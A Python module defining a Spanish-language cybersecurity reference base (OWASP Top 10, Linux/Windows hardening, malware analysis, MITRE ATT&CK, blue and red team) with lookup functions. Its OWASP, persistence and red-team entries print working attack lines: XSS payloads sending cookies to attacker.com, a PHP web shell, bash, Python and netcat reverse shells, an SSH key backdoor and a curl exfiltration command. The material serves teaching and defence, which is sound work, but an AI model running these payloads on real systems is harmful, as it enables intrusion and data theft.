CATEGORIES = [
    {
        "id": "owasp",
        "name": "OWASP",
        "icon": "Shield",
        "description": "Open Web Application Security Project - est\u00e1ndares y mejores pr\u00e1cticas de seguridad web.",
        "subcategories": [
            {
                "id": "top-10",
                "name": "Top 10",
                "summary": "Los 10 riesgos de seguridad m\u00e1s cr\u00edticos en aplicaciones web seg\u00fan OWASP (2021).",
                "content": "## OWASP Top 10 (2021)\n\nLos riesgos de seguridad m\u00e1s cr\u00edticos en aplicaciones web:\n\n**A01: Broken Access Control** \u2014 Fallos en la autorizaci\u00f3n permiten a usuarios acceder a recursos no permitidos.\n\n**A02: Cryptographic Failures** \u2014 Datos sensibles expuestos por cifrado d\u00e9bil o inexistente.\n\n**A03: Injection** \u2014 Inyecci\u00f3n de c\u00f3digo (SQL, NoSQL, OS, LDAP) cuando datos no confiables se env\u00edan a un int\u00e9rprete.\n\n**A04: Insecure Design** \u2014 Fallos en el dise\u00f1o de la aplicaci\u00f3n que no contemplan riesgos de seguridad.\n\n**A05: Security Misconfiguration** \u2014 Configuraciones inseguras por defecto, puertos abiertos, cuentas predeterminadas.\n\n**A06: Vulnerable and Outdated Components** \u2014 Uso de librer\u00edas y frameworks con vulnerabilidades conocidas.\n\n**A07: Identification and Authentication Failures** \u2014 Fallos en la autenticaci\u00f3n que permiten suplantaci\u00f3n de identidad.\n\n**A08: Software and Data Integrity Failures** \u2014 Actualizaciones sin verificar, pipelines CI/CD inseguros.\n\n**A09: Security Logging and Monitoring Failures** \u2014 Falta de registro y monitoreo que impide detectar brechas.\n\n**A10: Server-Side Request Forgery (SSRF)** \u2014 El servidor realiza peticiones a recursos internos no autorizados.\n\n```\nEjemplo de mitigaci\u00f3n general:\n- Validar y sanitizar todo input del usuario\n- Principio de menor privilegio\n- Parchear dependencias regularmente\n- Implementar logging y monitoreo\n```",
            },
            {
                "id": "sqli",
                "name": "SQL Injection",
                "summary": "Inyecci\u00f3n SQL \u2014 manipulaci\u00f3n de consultas a la base de datos a trav\u00e9s de input no sanitizado.",
                "content": "## SQL Injection (SQLi)\n\nLa inyecci\u00f3n SQL ocurre cuando datos proporcionados por el usuario se incluyen directamente en consultas SQL sin sanitizar.\n\n### Tipos comunes\n\n**In-Band SQLi:** El atacante usa el mismo canal para lanzar el ataque y recibir resultados.\n```sql\n' OR 1=1 --\n' UNION SELECT username,password FROM users --\n```\n\n**Blind SQLi:** El atacante no ve el resultado directamente, pero infiere informaci\u00f3n por respuestas booleanas o temporales.\n```sql\n' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' -- SLEEP(5)\n```\n\n**Out-of-Band SQLi:** El atacante usa canales alternativos (DNS, HTTP) para extraer datos.\n\n### Prevenci\u00f3n\n\n- **Consultas parametrizadas (prepared statements)**\n  ```python\n  cursor.execute(\"SELECT * FROM users WHERE email = ?\", (email,))\n  ```\n- **ORM seguro** como SQLAlchemy, Entity Framework\n- **Validaci\u00f3n estricta de tipos** en inputs num\u00e9ricos\n- **Principio de menor privilegio** en la cuenta de base de datos\n\n### Detecci\u00f3n\n\n```bash\n# Herramientas\nsqlmap -u \"http://target.com/page?id=1\" --batch\n```",
            },
            {
                "id": "xss",
                "name": "Cross-Site Scripting",
                "summary": "XSS \u2014 inyecci\u00f3n de scripts maliciosos en p\u00e1ginas web vistas por otros usuarios.",
                "content": "## Cross-Site Scripting (XSS)\n\nXSS permite a un atacante inyectar scripts en p\u00e1ginas web que ser\u00e1n ejecutados por el navegador de la v\u00edctima.\n\n### Tipos\n\n**Reflected XSS:** El script viaja en la URL o en un formulario y se refleja en la respuesta.\n```html\n<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>\n```\n\n**Stored XSS:** El script se almacena en el servidor (comentarios, perfiles) y se ejecuta cuando otros usuarios visitan la p\u00e1gina.\n\n**DOM-based XSS:** La vulnerabilidad existe en el c\u00f3digo JavaScript del lado del cliente, no en el servidor.\n\n### Prevenci\u00f3n\n\n- **Output encoding** contextual (HTML entity, JavaScript, URL, CSS)\n  ```html\n  &lt;script&gt; \u2192 <script>\n  ```\n- **Content Security Policy (CSP)**\n  ```http\n  Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com\n  ```\n- **HttpOnly + Secure + SameSite** en cookies\n- **Sanitizaci\u00f3n de HTML** con librer\u00edas como DOMPurify",
            },
            {
                "id": "csrf",
                "name": "CSRF",
                "summary": "Cross-Site Request Forgery \u2014 fuerza a un usuario autenticado a ejecutar acciones no deseadas.",
                "content": "## Cross-Site Request Forgery (CSRF)\n\nCSRF enga\u00f1a al navegador de una v\u00edctima autenticada para que ejecute peticiones no autorizadas en una aplicaci\u00f3n web.\n\n### C\u00f3mo funciona\n\n1. El usuario inicia sesi\u00f3n en `bank.com` (recibe cookie de sesi\u00f3n)\n2. El usuario visita `attacker.com` sin cerrar sesi\u00f3n\n3. `attacker.com` env\u00eda un formulario oculto a `bank.com/transfer`\n4. El navegador incluye autom\u00e1ticamente la cookie de sesi\u00f3n\n5. La transferencia se ejecuta sin consentimiento\n\n```html\n<form action=\"https://bank.com/transfer\" method=\"POST\">\n  <input name=\"amount\" value=\"1000\">\n  <input name=\"to\" value=\"attacker\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n\n### Prevenci\u00f3n\n\n- **CSRF Tokens:** Token \u00fanico vinculado a la sesi\u00f3n\n- **SameSite Cookies:** `Set-Cookie: session=abc; SameSite=Strict`\n- **Verificaci\u00f3n de cabeceras:** Comprobar `Origin` y `Referer`\n- **Custom headers:** Usar `X-Requested-With: XMLHttpRequest`",
            },
            {
                "id": "rce",
                "name": "RCE",
                "summary": "Remote Code Execution \u2014 ejecuci\u00f3n remota de c\u00f3digo en el servidor objetivo.",
                "content": "## Remote Code Execution (RCE)\n\nRCE permite a un atacante ejecutar comandos o c\u00f3digo arbitrario en el servidor objetivo.\n\n### Vectores comunes\n\n**Command Injection:** Entrada del usuario pasada directamente a un shell del sistema.\n```bash\nping -c 4 127.0.0.1; whoami\n```\n\n**Deserializaci\u00f3n insegura:** Objetos serializados manipulados que ejecutan c\u00f3digo al deserializar.\n```python\nimport pickle\npickle.loads(untrusted_data)  # \u00a1PELIGRO!\n```\n\n**File Upload:** Subida de archivos con ejecuci\u00f3n posterior.\n```bash\nSubir shell.php con: <?php system($_GET['cmd']); ?>\n```\n\n### Prevenci\u00f3n\n\n- **No usar funciones de shell** con input del usuario\n- **Usar listas de argumentos** en lugar de cadenas de shell\n- **Validar y restringir** tipos de archivo subidos\n- **Sandboxing** y contenedores con recursos limitados",
            },
            {
                "id": "ssrf",
                "name": "SSRF",
                "summary": "Server-Side Request Forgery \u2014 el servidor hace peticiones a recursos internos no autorizados.",
                "content": "## Server-Side Request Forgery (SSRF)\n\nSSRF ocurre cuando un servidor hace peticiones HTTP a destinos controlados por un atacante, permitiendo acceder a recursos internos.\n\n### Impacto\n\n- Acceso a **servicios internos** (localhost, 10.0.0.0/8, 172.16.0.0/12)\n- **Escaneo de puertos** internos\n- **Lectura de archivos** via `file://` protocol\n- **Interacci\u00f3n con metadata endpoints** de cloud providers\n\n```bash\n# AWS Metadata endpoint\ncurl http://169.254.169.254/latest/meta-data/\n```\n\n### Prevenci\u00f3n\n\n- **Whitelist de URLs/destinos permitidos**\n- **Denegar rangos de IP privadas** (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)\n- **Validar el esquema de URL** \u2014 solo permitir `https://`\n- **No seguir redirecciones** autom\u00e1ticamente\n- **Network segmentation** \u2014 el servidor web no deber\u00eda tener acceso a servicios internos",
            },
        ],
    },
    {
        "id": "linux",
        "name": "Linux",
        "icon": "Terminal",
        "description": "Comandos, hardening y t\u00e9cnicas de seguridad en sistemas Linux.",
        "subcategories": [
            {
                "id": "basicos",
                "name": "Comandos B\u00e1sicos",
                "summary": "Comandos esenciales de Linux para navegaci\u00f3n, archivos y procesos.",
                "content": "## Comandos B\u00e1sicos de Linux\n\n### Navegaci\u00f3n y archivos\n```bash\nls -la                    # Listar archivos con permisos\ncd /path/to/dir           # Cambiar directorio\npwd                       # Mostrar directorio actual\ncp -r origen destino      # Copiar recursivamente\nfind / -name \"*.conf\"     # Buscar archivos\ngrep -rn \"patron\" /path/  # Buscar texto en archivos\n```\n\n### Permisos\n```bash\nchmod 755 script.sh       # rwxr-xr-x\nchown user:group file     # Cambiar propietario\nchmod u+s binary          # SUID bit\ngetfacl file              # Ver ACLs\n```\n\n### Procesos\n```bash\nps aux                    # Todos los procesos\ntop                       # Monitor en vivo\nsystemctl status nginx    # Servicios systemd\njournalctl -xe            # Logs del sistema\n```\n\n### Red\n```bash\nss -tulpn                 # Puertos en escucha\nnetstat -ano              # Conexiones activas\ntcpdump -i eth0 port 80   # Capturar tr\u00e1fico\niptables -L -v            # Reglas de firewall\n```",
            },
            {
                "id": "hardening",
                "name": "Hardening",
                "summary": "Mejores pr\u00e1cticas para asegurar un servidor Linux contra ataques.",
                "content": "## Hardening de Linux\n\n### SSH Hardening\n```bash\n# /etc/ssh/sshd_config\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\nPort 2222\nMaxAuthTries 3\n```\n\n### Firewall\n```bash\nufw default deny incoming\nufw default allow outgoing\nufw allow 2222/tcp\nufw enable\n```\n\n### Kernel Hardening\n```bash\n# /etc/sysctl.conf\nnet.ipv4.tcp_syncookies = 1\nnet.ipv4.conf.all.rp_filter = 1\nkernel.randomize_va_space = 2\n```\n\n### Auditor\u00eda\n```bash\nlynis audit system       # Auditor\u00eda de seguridad\nrkhunter --check          # Detectar rootkits\nclamscan -r /home/        # Antivirus\n```",
            },
            {
                "id": "incident-response",
                "name": "Respuesta a Incidentes",
                "summary": "Procedimientos y comandos para responder a incidentes de seguridad en Linux.",
                "content": "## Respuesta a Incidentes en Linux\n\n### Triage inicial\n```bash\ndate                         # L\u00ednea de tiempo\nw                           # Usuarios conectados\nlast                        # \u00daltimos inicios de sesi\u00f3n\nps auxf                     # \u00c1rbol de procesos\nss -tulpn                   # Conexiones de red\nlsof -i                     # Archivos abiertos en red\n```\n\n### Buscar IoCs\n```bash\n# Archivos modificados en las \u00faltimas 24h\nfind / -mtime -1 -type f 2>/dev/null\n\n# Procesos sospechosos\nps aux | grep -E \"\\.(pl|py|sh|php)$\"\n\n# Conexiones extra\u00f1as\nss -antp | grep ESTAB\n\n# Persistencia\nls -la /etc/cron* /etc/init.d/ ~/.ssh/\ncat /etc/crontab /var/spool/cron/crontabs/*\n```\n\n### An\u00e1lisis forense\n```bash\ndd if=/dev/sda of=/mnt/evidence/image.dd bs=4K\nstat archivo_sospechoso\nfile archivo_sospechoso\nstrings archivo_sospechoso | head -50\n```",
            },
        ],
    },
    {
        "id": "windows",
        "name": "Windows",
        "icon": "Monitor",
        "description": "Seguridad, PowerShell y t\u00e9cnicas de hardening en Windows.",
        "subcategories": [
            {
                "id": "powershell",
                "name": "PowerShell Seguro",
                "summary": "Cmdlets de seguridad, execution policy y logging en PowerShell.",
                "content": "## PowerShell Seguro\n\n### Execution Policy\n```powershell\nGet-ExecutionPolicy\nSet-ExecutionPolicy RemoteSigned\npowershell -ExecutionPolicy Bypass -File script.ps1\n```\n\n### Logging (Script Block Logging)\n```powershell\nSet-ItemProperty -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-PowerShell/Operational\"; ID=4104}\n```\n\n### Cmdlets de seguridad\n```powershell\nGet-Process | Where-Object {$_.CPU -gt 50}\nGet-Service | Where-Object {$_.Status -eq \"Running\"}\nGet-NetTCPConnection | Where-Object {$_.State -eq \"Established\"}\nGet-ChildItem -Path C:\\Users\\*\\Desktop -Recurse | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}\n```",
            },
            {
                "id": "persistence",
                "name": "Persistencia",
                "summary": "T\u00e9cnicas de persistencia en Windows: Run Keys, Scheduled Tasks, WMI y m\u00e1s.",
                "content": "## Persistencia en Windows\n\n### Run Keys (Registro)\n```powershell\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /t REG_SZ /d \"C:\\malware.exe\"\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /t REG_SZ /d \"C:\\malware.exe\"\n```\n\n### Scheduled Tasks\n```powershell\nschtasks /create /tn \"Updater\" /tr \"C:\\malware.exe\" /sc daily /st 09:00\nschtasks /query /fo LIST /v | findstr /i \"malware\"\n```\n\n### Startup Folder\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\n```\n\n### WMI Event Subscription\n```powershell\nRegister-WmiEvent -Query \"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'\" -Action { Start-Process \"C:\\malware.exe\" }\n```\n\n### Detecci\u00f3n\n```powershell\nautorunsc.exe -a -c\nGet-CimInstance Win32_StartupCommand\nGet-ScheduledTask | Where-Object {$_.TaskPath -notlike \"\\Microsoft\\*\"}\n```",
            },
            {
                "id": "network-forensics",
                "name": "Forense de Red",
                "summary": "An\u00e1lisis de conexiones de red, puertos y tr\u00e1fico en Windows.",
                "content": "## Forense de Red en Windows\n\n### Conexiones activas\n```powershell\nnetstat -anob | findstr ESTABLISHED\nGet-NetTCPConnection -State Established | Select LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess\nGet-Process -Id (Get-NetTCPConnection -RemotePort 4444).OwningProcess\n```\n\n### Puertos en escucha\n```powershell\nnetstat -ano | findstr LISTENING\nGet-NetTCPConnection -State Listen\n```\n\n### Captura de tr\u00e1fico\n```powershell\npktmon start --etw -p 0\npktmon stop\npktmon etl2pcap output.etl\n```\n\n### An\u00e1lisis de logs\n```powershell\nGet-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=5156}\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-Sysmon/Operational\"; ID=3}\n```",
            },
        ],
    },
    {
        "id": "python",
        "name": "Python",
        "icon": "Code",
        "description": "Scripting de seguridad, automatizaci\u00f3n y herramientas con Python.",
        "subcategories": [
            {
                "id": "seguro",
                "name": "C\u00f3digo Seguro",
                "summary": "Pr\u00e1cticas para escribir c\u00f3digo Python seguro y evitar vulnerabilidades comunes.",
                "content": "## C\u00f3digo Seguro en Python\n\n### Evitar inyecci\u00f3n de comandos\n```python\n# MALO\nsubprocess.run(f\"ping -c 4 {host}\", shell=True)\n\n# BUENO\nsubprocess.run([\"ping\", \"-c\", \"4\", host])\n\n# MALO\neval(user_input)\n\n# BUENO\nast.literal_eval(user_input)\n```\n\n### Deserializaci\u00f3n segura\n```python\n# PELIGROSO\nimport pickle\ndata = pickle.loads(untrusted_input)\n\n# SEGURO\nimport json\ndata = json.loads(untrusted_input)\n```\n\n### Validaci\u00f3n de entrada\n```python\nfrom pydantic import BaseModel, Field\n\nclass UserInput(BaseModel):\n    name: str = Field(min_length=1, max_length=100)\n    email: str = Field(max_length=255)\n```",
            },
            {
                "id": "networking",
                "name": "Networking",
                "summary": "Socket programming, HTTP clients y herramientas de red en Python.",
                "content": "## Networking con Python\n\n### Cliente HTTP seguro\n```python\nimport httpx\ntimeout = httpx.Timeout(10.0, connect=5.0)\nclient = httpx.Client(timeout=timeout)\nresponse = client.get(\"https://api.example.com\", verify=True)\n```\n\n### Socket scanning\n```python\nimport socket\ndef scan_port(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(2)\n    result = sock.connect_ex((host, port))\n    sock.close()\n    return result == 0\n```\n\n### Servidor b\u00e1sico\n```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nclass SecureHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        if not self.is_authenticated():\n            self.send_response(401)\n            self.end_headers()\n            return\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b\"OK\")\n```",
            },
        ],
    },
    {
        "id": "malware",
        "name": "Malware",
        "icon": "Bug",
        "description": "An\u00e1lisis de malware, tipos, t\u00e9cnicas de persistencia y detecci\u00f3n de IoCs.",
        "subcategories": [
            {
                "id": "tipos",
                "name": "Tipos de Malware",
                "summary": "Clasificaci\u00f3n de malware: virus, gusanos, trojans, ransomware, rootkits.",
                "content": "## Tipos de Malware\n\n### Virus\nSe replica insertando su c\u00f3digo en otros programas ejecutables.\n\n### Gusano (Worm)\nSe auto-replica sin necesidad de un archivo hu\u00e9sped, propag\u00e1ndose por la red.\n\n### Troyano (Trojan)\nSoftware malicioso disfrazado de programa leg\u00edtimo. No se replica por s\u00ed mismo.\n\n### Ransomware\nCifra archivos de la v\u00edctima y exige un rescate por la clave de descifrado.\n```\nEjemplo: WannaCry (2017) \u2014 explot\u00f3 EternalBlue\n         Afect\u00f3 +200,000 equipos en 150 pa\u00edses\n```\n\n### Rootkit\nOculta su presencia y la de otros malware modificando el sistema operativo.\n\n### C&C Indicators\n```bash\n# Conexiones peri\u00f3dicas a servidores externos\n# Tr\u00e1fico en puertos no est\u00e1ndar\n# DNS queries a dominios DGA\n# Beaconing - peticiones HTTP regulares\n```",
            },
            {
                "id": "analisis",
                "name": "An\u00e1lisis Est\u00e1tico",
                "summary": "T\u00e9cnicas de an\u00e1lisis de malware sin ejecutar la muestra: strings, PE analysis, hashes.",
                "content": "## An\u00e1lisis Est\u00e1tico de Malware\n\n### Extracci\u00f3n de strings\n```bash\nstrings malware.exe | grep -E \"(http|https|ftp)://\"\nstrings malware.exe | grep -i \"C:\\\\\"\nstrings -n 8 malware.exe | sort | uniq\n```\n\n### Hash matching (VirusTotal)\n```bash\nsha256sum malware.exe\nmd5sum malware.exe\n# Buscar el hash en VirusTotal API\n```\n\n### PE Analysis\n```bash\nfile malware.exe\nexiftool malware.exe\nobjdump -p malware.exe | grep -E \"(SECTION|Name|Characteristics)\"\nobjdump -p malware.exe | grep \"DLL Name\"\n```\n\n### Herramientas\n- **pefile** (Python): `pe = pefile.PE(\"malware.exe\")`\n- **YARA**: Reglas para detectar patrones\n- **FLOSS**: Deobfuscated strings\n- **CAPA**: Detecta capacidades de malware",
            },
        ],
    },
    {
        "id": "mitre",
        "name": "MITRE ATT&CK",
        "icon": "Layers",
        "description": "Framework MITRE ATT&CK \u2014 t\u00e1cticas, t\u00e9cnicas y procedimientos de adversarios.",
        "subcategories": [
            {
                "id": "tacticas",
                "name": "T\u00e1cticas",
                "summary": "Las 14 t\u00e1cticas del framework MITRE ATT&CK para entender el ciclo de vida de un ataque.",
                "content": "## T\u00e1cticas MITRE ATT&CK (Enterprise)\n\nEl framework organiza el comportamiento del adversario en 14 t\u00e1cticas:\n\n| # | T\u00e1ctica | Descripci\u00f3n |\n|---|---------|-------------|\n| 1 | **Reconnaissance** | Recolecci\u00f3n de informaci\u00f3n del objetivo |\n| 2 | **Resource Development** | Preparaci\u00f3n de infraestructura |\n| 3 | **Initial Access** | Obtenci\u00f3n de acceso inicial |\n| 4 | **Execution** | Ejecuci\u00f3n de c\u00f3digo malicioso |\n| 5 | **Persistence** | Mantener acceso en el sistema |\n| 6 | **Privilege Escalation** | Obtener permisos elevados |\n| 7 | **Defense Evasion** | Evitar detecci\u00f3n |\n| 8 | **Credential Access** | Robo de credenciales |\n| 9 | **Discovery** | Reconocimiento interno |\n| 10 | **Lateral Movement** | Movimiento lateral |\n| 11 | **Collection** | Recolecci\u00f3n de datos |\n| 12 | **Command and Control** | Comunicaci\u00f3n C2 |\n| 13 | **Exfiltration** | Extracci\u00f3n de datos |\n| 14 | **Impact** | Manipulaci\u00f3n o destrucci\u00f3n |\n\n### Uso pr\u00e1ctico\n```bash\nT1055 (Process Injection) \u2192 M1040 (Behavior Prevention)\nT1566 (Phishing) \u2192 M1017 (User Training)\nT1486 (Data Encrypted for Impact) \u2192 M1040 (Behavior Prevention)\n```",
            },
            {
                "id": "tecnicas",
                "name": "T\u00e9cnicas Comunes",
                "summary": "T\u00e9cnicas MITRE ATT&CK m\u00e1s utilizadas en ataques reales y c\u00f3mo detectarlas.",
                "content": "## T\u00e9cnicas MITRE ATT&CK Comunes\n\n### T1059 \u2014 Command and Scripting Interpreter\n```bash\n# Detecci\u00f3n: PowerShell, Bash, CMD ejecutando scripts\n# Windows: Event ID 4688 (Process Creation)\n# Linux: auditd execve syscalls\n```\n\n### T1055 \u2014 Process Injection\n```\nT\u00e9cnicas:\n  - DLL Injection: CreateRemoteThread + LoadLibrary\n  - Process Hollowing: SuspendProcess \u2192 Unmap \u2192 Write \u2192 Resume\n  - APC Injection: QueueUserAPC en hilos de otro proceso\n```\n\n### T1566 \u2014 Phishing\n```\nVariantes:\n  - Spearphishing Attachment (T1566.001)\n  - Spearphishing Link (T1566.002)\n  - Spearphishing via Service (T1566.003)\n```\n\n### T1071 \u2014 Application Layer Protocol\n```\nC2 sobre protocolos leg\u00edtimos:\n  - HTTP/HTTPS (T1071.001)\n  - DNS (T1071.004)\n  - WebSocket\n```",
            },
        ],
    },
    {
        "id": "blue-team",
        "name": "Blue Team",
        "icon": "ShieldCheck",
        "description": "Defensa, monitoreo, detecci\u00f3n y respuesta a incidentes para el equipo azul.",
        "subcategories": [
            {
                "id": "monitoreo",
                "name": "Monitoreo",
                "summary": "Estrategias de monitoreo continuo, SIEM, EDR y detecci\u00f3n de anomal\u00edas.",
                "content": "## Monitoreo de Seguridad\n\n### Capas de monitoreo\n\n**EDR (Endpoint Detection & Response):** Monitoreo de endpoints en tiempo real.\n- Sysmon + Event Logs\n- Windows Defender for Endpoint / CrowdStrike / SentinelOne\n\n**SIEM (Security Information & Event Management):** Correlaci\u00f3n centralizada.\n- Wazuh / Splunk / ELK Stack\n- Reglas de correlaci\u00f3n y alertas en tiempo real\n\n**Network Detection:**\n- Zeek \u2014 an\u00e1lisis de tr\u00e1fico\n- Suricata \u2014 IDS/IPS\n- DNS logging \u2014 detecci\u00f3n de DGA y C2\n\n### Qu\u00e9 monitorear\n```yaml\nPrioridad alta:\n  - Creaci\u00f3n de procesos sospechosos\n  - Conexiones salientes a IPs maliciosas\n  - Modificaciones en Run Keys y Scheduled Tasks\n  - Cuentas de usuario creadas en dominio\n  - Logs de autenticaci\u00f3n fallidos masivos\n```",
            },
            {
                "id": "hardening-bt",
                "name": "Hardening",
                "summary": "Gu\u00edas de hardening para sistemas Windows, Linux y aplicaciones web.",
                "content": "## Hardening para Blue Team\n\n### CIS Benchmarks\nGu\u00edas de configuraci\u00f3n segura avaladas por el Center for Internet Security.\n\n### Active Directory Hardening\n```yaml\n- Implementar Tier Model (T0, T1, T2)\n- Usar Group Managed Service Accounts (gMSA)\n- Deshabilitar NTLM, forzar Kerberos\n- Configurar SMB signing\n- LAPS para contrase\u00f1as de administrador local\n```\n\n### Web Application Hardening\n```yaml\nSecurity Headers:\n  Content-Security-Policy: default-src 'self'\n  X-Content-Type-Options: nosniff\n  X-Frame-Options: DENY\n  Strict-Transport-Security: max-age=31536000\n  X-XSS-Protection: 0\n  Referrer-Policy: strict-origin-when-cross-origin\n```",
            },
        ],
    },
    {
        "id": "red-team",
        "name": "Red Team",
        "icon": "Flame",
        "description": "T\u00e9cnicas ofensivas, reconocimiento, explotaci\u00f3n y post-explotaci\u00f3n para el equipo rojo.",
        "subcategories": [
            {
                "id": "recon",
                "name": "Reconocimiento",
                "summary": "Fase de reconocimiento: passive recon, active recon, OSINT y footprinting.",
                "content": "## Reconocimiento (Red Team)\n\n### Passive Recon (OSINT)\n```bash\nwhois target.com\ndig target.com ANY\nnslookup -type=MX target.com\ndnsrecon -d target.com\nsublist3r -d target.com\nwhatweb target.com\n```\n\n### Active Recon\n```bash\nnmap -sV -sC -T4 -p- target.com\nmasscan 192.168.1.0/24 -p80,443,22 --rate=1000\ngobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt\n```\n\n### Herramientas esenciales\n- **Nmap** \u2014 Escaneo de puertos y servicios\n- **Whois/DNSRecon** \u2014 OSINT pasivo\n- **Shodan** \u2014 B\u00fasqueda de dispositivos\n- **Google Dorks** \u2014 B\u00fasqueda avanzada\n- **theHarvester** \u2014 Recolecci\u00f3n de correos",
            },
            {
                "id": "exploit",
                "name": "Explotaci\u00f3n",
                "summary": "T\u00e9cnicas de explotaci\u00f3n de vulnerabilidades, shells, pivoting y post-explotaci\u00f3n.",
                "content": "## Explotaci\u00f3n (Red Team)\n\n### Web Exploitation\n```bash\n# SQL Injection\nsqlmap -u \"http://target.com/page?id=1\" --batch --dbs\n\n# XSS\n# Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n\n# File Upload\n# Subir shell.php con: <?php system($_GET['cmd']); ?>\n```\n\n### Reverse Shells\n```bash\n# Bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n# Python\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Netcat\nnc -e /bin/bash 10.0.0.1 4444\n```\n\n### Post-Explotaci\u00f3n\n```bash\n# Pass-the-Hash (Windows)\npsexec.py DOMAIN/user@target -hashes LM:NTLM\n\n# Persistencia - SSH Key backdoor\necho \"ssh-rsa AAA...\" >> ~/.ssh/authorized_keys\n\n# Data exfiltration\ntar czf - /data | curl -X POST --data-binary @- https://attacker.com/exfil\n```",
            },
        ],
    },
]


def get_categories():
    return [
        {
            "id": c["id"],
            "name": c["name"],
            "icon": c["icon"],
            "description": c["description"],
            "subcategories": [
                {"id": s["id"], "name": s["name"], "summary": s["summary"]}
                for s in c["subcategories"]
            ],
        }
        for c in CATEGORIES
    ]


def get_content(category_id: str, subcategory_id: str) -> dict | None:
    for cat in CATEGORIES:
        if cat["id"] == category_id:
            for sub in cat["subcategories"]:
                if sub["id"] == subcategory_id:
                    return {
                        "category": cat["name"],
                        "title": sub["name"],
                        "content": sub["content"],
                    }
    return None
